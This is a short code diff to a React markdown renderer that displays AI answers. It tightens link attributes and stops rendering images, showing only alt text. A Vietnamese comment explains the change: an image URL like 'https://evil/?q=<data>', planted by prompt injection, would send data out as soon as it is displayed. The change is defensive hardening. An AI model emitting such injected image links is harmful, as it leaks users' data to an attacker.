@@ -41,7 +41,10 @@ const MD_CLS = 'text-[13.5px] leading-[1.65] text-ink [&_p]:mb-2 [&_p:last-child
 const markdownComponents = {
   a: ({ href, children }) => (href?.startsWith('/')
     ? <Link to={href} className="text-accent font-semibold no-underline hover:underline">{children}</Link>
-    : <a href={href} target="_blank" rel="noreferrer" className="text-accent underline">{children}</a>),
+    : <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="text-accent underline">{children}</a>),
+  // Không tải ảnh từ câu trả lời của AI: ![](https://evil/?q=<dữ liệu>) do prompt injection chèn vào
+  // sẽ tự gửi dữ liệu ra ngoài ngay khi hiển thị, không cần ai bấm. Chỉ giữ lại chữ thay thế (alt).
+  img: ({ alt }) => (alt ? <span className="text-ink-3">[{alt}]</span> : null),
 };
 
 function CourseChip({ course }) {
